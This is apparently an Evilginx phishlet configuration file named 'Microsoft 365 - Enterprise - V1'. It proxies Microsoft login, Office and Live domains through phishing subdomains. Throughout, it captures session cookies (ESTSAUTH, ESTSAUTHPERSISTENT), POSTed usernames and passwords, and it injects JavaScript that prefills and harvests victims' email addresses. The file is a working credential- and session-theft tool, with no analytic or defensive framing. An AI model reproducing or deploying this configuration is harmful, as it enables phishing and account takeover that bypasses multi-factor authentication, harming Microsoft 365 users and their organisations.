name: 'Microsoft 365 - Enterprise - V1'
author: '@waelmas'
min_ver: '3.2.0'
redirect_url: 'https://www.office.com'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing: false}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
    type: 'cookie'

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/?auth=2'

js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/', '/common', '/organizations', '/consumers']
    script: |
      (function() {
        console.log("[*] O365 Phishlet: email autograb active (console-only mode).");

        function findEmailField() {
          return document.querySelector(
            'input[type="email"], input[name="loginfmt"], input[name="login"], input#i0116, input#email'
          );
        }

        function getQueryParam(name) {
          name = name.replace(/[\[\]]/g, "\\$&");
          var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
              results = regex.exec(window.location.href);
          if (!results) return null;
          if (!results[2]) return '';
          return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        // ===== 1. PREFILL from ?email= parameter =====
        var prefillEmail = getQueryParam('email');
        if (prefillEmail && prefillEmail.includes('@')) {
          var emailField = findEmailField();
          if (emailField) {
            emailField.value = prefillEmail;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
            emailField.dispatchEvent(new Event('change', { bubbles: true }));
            console.log("[*] PREFILL: " + prefillEmail);
          }
        }

        // ===== 2. AUTOGRAB – log to console only =====
        var emailGrabbed = false;

        function grabEmail() {
          if (emailGrabbed) return;
          var field = findEmailField();
          if (field && field.value && field.value.includes('@')) {
            console.log("[*] AUTOGRAB: " + field.value);
            console.log("[*] TIMESTAMP: " + new Date().toISOString());
            console.log("[*] SOURCE: browser autofill");
            emailGrabbed = true;
            clearInterval(grabInterval);
          }
        }

        grabEmail();
        var grabInterval = setInterval(grabEmail, 500);

        setTimeout(function() {
          clearInterval(grabInterval);
          if (!emailGrabbed) {
            console.log("[*] AUTOGRAB: No email detected within timeout.");
          }
        }, 15000);

      })();
